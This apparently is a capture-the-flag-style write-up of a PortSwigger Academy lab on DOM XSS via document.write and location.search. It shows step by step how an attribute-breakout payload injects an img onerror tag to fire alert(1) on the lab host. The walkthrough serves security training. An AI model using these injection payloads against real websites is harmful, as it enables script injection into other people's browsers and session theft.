## 🧪 Lab: DOM XSS in document.write sink using source location.search (APPRENTICE)

### 🎯 Mission Description  
This lab has a **DOM-based XSS** vulnerability. It uses `document.write()` with data taken directly from `location.search`, meaning any input we put in the URL gets written into the page without sanitization.

### 🎯 Mission Objective  
Trigger an `alert(1)` using a DOM XSS payload via the search parameter in the URL.

### 🧩 Steps  
1. Open the lab URL:  
   ```
   https://0add009903d34e0d801703b700e20038.web-security-academy.net/?search=
   ```

2. Try basic input like:  
   ```
   ?search=test
   ```

   Check source → you’ll see:
   ```html
   <img src="/resources/images/tracker.gif?searchTerms=test">
   ```

3. Try testing for injection:
   ```
   ?search=X<"x
   ```

   You get:
   ```html
   <img src="/resources/images/tracker.gif?searchTerms=X<"x">
   ```

   So yep — it reflects directly into an attribute → promising!

4. Try a standard payload like:
   ```
   <img src=x onerror=alert(1)>
   ```

   Encoded as:
   ```
   ?search=%3Cimg+src%3Dx+onerror%3Dalert(1)%3E
   ```

   → **filtered / blocked**

5. Let’s look deeper... The payload gets placed inside the `src` attribute value of an `<img>`. So, we need to break out of that attribute **safely**.

6. Use this payload:
   ```
   ?search=flex"><img src=x onerror=alert(1)><!--
   ```

   Which results in:
   ```html
   <img src="/resources/images/tracker.gif?searchTerms=flex"><img src=x onerror=alert(1)><!--">
   ```

   🔥 The first `"` closes the `src`, then we inject a whole new `<img>` tag with the payload.

7. Boom 💥 alert box appears → solved.

### 💣 Final Payload  
```
https://0add009903d34e0d801703b700e20038.web-security-academy.net/?search=flex"><img src=x onerror=alert(1)><!--
```

### 📝 Notes  
- Classic DOM XSS using `document.write()` with `location.search`.
- Injection point is inside an `img` tag’s `src` attribute.
- The payload closes the attribute, injects a new tag, and comments out the rest.

**Status: Solved ✅**
